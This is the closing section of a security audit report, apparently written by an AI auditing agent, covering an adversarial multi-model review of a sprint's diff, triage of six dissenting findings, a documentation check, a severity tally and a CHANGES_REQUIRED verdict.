Run: `.claude/scripts/adversarial-review.sh --type audit --sprint-id sprint-1 --diff-file pr/head.diff --json` → `grimoires/loa/a2a/sprint-1/adversarial-audit.json` (`metadata.model: gpt-5.5-pro`, `status: clean`, `degraded: false`, `budget_cents_effective: 1146`, diff sha256 `37a749e2…913029`). Primary `gpt-5.5-pro` answered `clean` (no findings). Companion `claude-headless` (anthropic family, `counted_as: independent_voice`, `independent: true`) returned 6 findings; `verdict_quality.status: APPROVED`, 2/2 voices. `metadata.locality` is null (hosted run) — not DEGRADED_SECURITY_REVIEW. Hallucination filter applied, 0 downgraded. No `advisory_voices` block (none configured). The companion read the workspace tree, which is a later revision: it cites `validate_local_fallbacks`, `hop_is_local` and `_local_labels`, none of which exist in head; every anchor below was re-checked against `pr/head/`.

| Dissent | Triage |
|---------|--------|
| DISS-C-001 (MEDIUM) provider-block label honoured by planner, not by `_transport_policy`/MODELINV | Scenario does not occur on head: the loader refuses a model without a model-level `dispatch_group` (loader.py:1025, reproduced). Residual inconsistency tallied as LOW-007. |
| DISS-C-002 (MEDIUM) `hop_locality_of` label-only; public host recorded `local` | Confirmed and reproduced; folded into HIGH-001 (the `destination`-for-undeclared-provider half is LOW-004). |
| DISS-C-003 (LOW) unknown `hounfour.locality` silently omitted from the row; no load-time refusal in cheval | Confirmed for the cheval loader (the planners do refuse); folded into MED-001. |
| DISS-C-004 (LOW) server-revocable schema enforcement | Design (SDD §6), recorded truthfully; Observation, not tallied. |
| DISS-C-005 (LOW) encoded traversal past the path-prefix rule | Latent (URL built by the adapter); Observation, not tallied. |
| DISS-C-006 (LOW) credential in clear text over an opted-in http host, no warning | Confirmed; tallied as LOW-008. |

## Rejected dissent payloads

None: `metadata.rejected_count` is 0, `metadata.rejected_summary` is `[]`, `metadata.rejected_sidecars` is `[]`, the companion's `rejected_sidecar` is null, and no `adversarial-rejected-audit*.jsonl` exists beside the envelope.

## Review-trailer reconciliation

The review trailer (`engineer-feedback.md`) counts `excluded: 0`; there are no demotions to confirm, so `excluded_confirmed` is 0. Both review HIGHs were independently re-derived and reproduced on head and are tallied here as HIGH-001 and HIGH-002 (confidence medium on both, for the reasons stated). The review's second §1 MEDIUM (provider-block label dispatched without the policy) is corrected: cheval refuses that config at load (LOW-007).

## Documentation Audit

No `grimoires/loa/a2a/subagent-reports/documentation-coherence-*.md` exist in this snapshot (the eval layout has no implementation run). Manually verified the docs the change touches: `multi-model-reference.md`, `scripts-reference.md`, `bridgebuilder-review/SKILL.md`, `.loa.config.yaml.example`, `README.md`, the two gate SKILL.md one-liners, the MODELINV payload schema and `model-config.schema.json`. Three doc-vs-code mismatches are tallied above (HIGH-002 SKILL.md:118; MED-002 scripts-reference.md:73 / multi-model-reference.md:102; MED-004 example:1624/1690). Security-critical code is commented (every new block cites its SDD decision). CHANGELOG coverage could not be verified (LOW-009).

---

## Severity Tally

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 2 |
| Medium | 5 |
| Low | 9 |

---

## Verdict

**CHANGES_REQUIRED**

Two HIGH findings force the verdict under the one-way rule. The sprint also lacks senior-lead approval (the review verdict is CHANGES REQUIRED), so no `COMPLETED` marker is written and the ledger status is unchanged.

**Next Steps:**
1. `/implement sprint-1` to address HIGH-001 and HIGH-002 (and the MEDIUMs where cheap), then `/review-sprint sprint-1` to clear the review gate.
2. Re-run `/audit-sprint sprint-1`.

---

**Audit Completed:** 2026-10-22T07:22:00Z
**Remediation Tracking:** `grimoires/loa/a2a/audits/2026-10-22/`

---

*Generated by Paranoid Cypherpunk Auditor Agent*

<!-- LOA-VERDICT {"gate":"audit","verdict":"CHANGES_REQUIRED","counts":{"critical":0,"high":2,"medium":5,"low":9},"excluded":0,"excluded_confirmed":0,"sprint_id":"sprint-1","ts":"2026-10-22T07:22:00Z"} -->
